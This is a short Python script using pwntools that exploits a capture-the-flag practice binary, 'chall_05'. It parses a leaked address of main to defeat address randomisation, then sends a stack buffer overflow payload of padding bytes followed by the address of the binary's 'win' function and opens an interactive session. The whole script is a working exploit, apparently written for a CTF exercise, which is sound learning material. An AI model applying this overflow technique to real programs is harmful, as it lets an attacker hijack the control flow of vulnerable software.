from pwn import *
import re
'''
#Chall_05 exploit
'''
context.arch="amd64"

binary = context.binary = ELF('./chall_05')
p = process(binary.path)
resp = p.recv()
re.findall(b"(0x[0-9a-f]{6,16})", resp)
main = int(re.findall(b"(0x[0-9a-f]{6,16})", resp)[0], 16)


print(hex(main))

binary.address = main -binary.sym.main

payload  = b''
payload += (0x68 -0x10) * b'A'
payload += p64(binary.sym.win)

p.sendline(payload)
p.interactive()